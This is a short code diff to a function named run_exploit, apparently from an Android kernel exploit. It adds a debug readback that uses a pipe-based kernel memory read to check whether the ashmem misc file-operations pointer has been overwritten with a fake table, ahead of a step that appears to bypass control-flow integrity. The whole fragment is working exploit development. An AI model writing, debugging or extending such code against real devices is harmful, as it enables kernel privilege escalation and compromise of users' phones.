@@ -247,6 +247,11 @@ int run_exploit(int argc, char **argv) {
   }
   for (int attempt = 1; attempt <= 1; attempt++) {
     int triggered = app_trigger_fops_slide_route();
+    uintptr_t misc_fops_addr = data_addr(ASHMEM_MISC_FOPS);
+    uint64_t misc_fops_val = pipe_read64(0, misc_fops_addr);
+    pr_info("MISCFOPS_READBACK triggered=%d target=%016zx value=%016llx want=%016zx\n",
+            triggered, misc_fops_addr, (unsigned long long)misc_fops_val,
+            (uintptr_t)fake_fops);
     int verified = triggered && try_cfi_stage();
     pr_info("app fops slide attempt=%d/1 triggered=%d verified=%d "
             "step=%d errno=%d\n",
